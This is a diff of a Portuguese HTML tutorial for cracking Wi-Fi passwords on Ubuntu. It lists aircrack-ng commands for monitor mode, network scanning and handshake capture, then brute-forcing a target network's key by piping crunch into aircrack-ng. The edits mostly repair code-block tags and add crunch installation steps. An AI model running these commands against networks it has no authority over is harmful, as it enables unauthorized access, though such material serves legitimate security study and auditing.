@@ -1,21 +1,20 @@
+<h1>Prática Ubuntu</h1>
 <p>
 Instale o aircrack-ng:
 </p>
 
 <p>
-<precode><code>sudo apt-get update
+<pre><code>sudo apt-get update
+sudo apt-get install aircrack-ng
 </code></pre>
 </p>
-<p>
-<precode><code>sudo apt-get install aircrack-ng
-</code></pre>
-</p>
+
 <p>
 Verificar o nome da sua interface Wi-FI:
 </p>
 
 <p>
-<precode><code>iwconfig
+<pre><code>iwconfig
 </code></pre>
 </p>
 
@@ -24,7 +23,7 @@ Após verificar o nome da interface, deve-se verificar se o Ubuntu está reconhe
 </p>
 
 <p>
-<precode><code>sudo airmon-ng
+<pre><code>sudo airmon-ng
 </code></pre>
 </p>
 
@@ -33,7 +32,7 @@ verificar se tem algum processo que pode acabar atrapalhando o processo de captu
 </p>
 
 <p>
-<precode><code>sudo airmon-ng check kill
+<pre><code>sudo airmon-ng check kill
 </code></pre>
 </p>
 
@@ -42,18 +41,17 @@ Vamos colocar nossa placa de rede em modo monitor:
 </p>
 
 <p>
-<precode><code>sudo airmon-ng start [nome_da_sua_interface_wireless]
+<pre><code>sudo airmon-ng start [nome_da_sua_interface_wireless]
+iwconfig
 </code></pre>
 </p>
-<p>
-<precode><code>iwconfig
-</code></pre>
+
 <p>
 Quando a placa estiver pronta para monitorar, podemos ver quais são as redes disponíveis para nossos possíveis ataques.
 </p>
 
 <p>
-<precode><code>airodump-ng [nome_da_sua_interface_wireless]
+<pre><code>airodump-ng [nome_da_sua_interface_wireless]
 </code></pre>
 
 <p>
@@ -88,17 +86,36 @@ sudo aircrack-ng net-01.cap
 </p>
 
 <p>
+Caso não já tenha instalado, será necessário a instalação do programa crunch:
+</p>
+<p>
+<pre><code>sudo apt-get update
+</code></pre>
+</p>
+<p>
+<pre><code>sudo apt-get install crunch
+</code></pre>
+</p>
+
+<p>
 Hora de quebrar no Brute Force:
+</p>
 <p>
 <pre><code>sudo crunch [min] [max] [padrão] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
 </code></pre>
 </p>
 
 <p>
+Você também pode usar o seguinte comando, caso deseje começar a busca a partir de uma determinada combinação dentro padrão.
+</p>
+<p>
+<pre><code>sudo crunch [min] [max] [padrão] -s [combinação] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
+</code></pre>
+<p>
 Ao final, temos de reativar o nosso network-manager pois ao usar o comando check kill ele o desativa.
 </p>
 
 <p>
-<precode><code>sudo service network-manager start
+<pre><code>sudo service network-manager start
 </code></pre>
 </p>
